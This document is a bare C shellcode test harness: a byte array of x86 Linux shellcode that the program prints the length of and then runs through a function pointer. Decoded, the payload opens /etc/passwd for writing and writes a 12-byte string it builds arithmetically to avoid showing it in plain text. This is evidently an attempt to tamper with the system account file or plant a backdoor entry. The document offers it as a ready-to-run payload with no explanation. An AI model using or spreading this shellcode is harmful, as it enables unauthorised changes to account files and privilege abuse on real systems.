#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xdb\xf7\xe3\xb0\x05\x89\xd9\x51\xc7\x44\x24\xfc\x73\x73\x77\x64\xc7\x44\x24\xf8\x2f\x2f\x70\x61\xc7\x44\x24\xf4\x2f\x65\x74\x63\x83\xec\x0c\x89\xe3\x66\xb9\x91\x01\xcd\x80\x89\xc3\xb0\x04\x52\xbe\x20\x20\x20\x20\x81\xc6\x11\x11\x11\x11\x56\xbe\x20\x20\x20\x20\x81\xc6\x11\x11\x11\x11\x56\xbe\x61\x20\x20\x63\x81\xc6\x11\x10\x10\x11\x56\x89\xe1\x6a\x0c\x5a\xcd\x80\xb0\x06\xcd\x80\xb0\x01\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
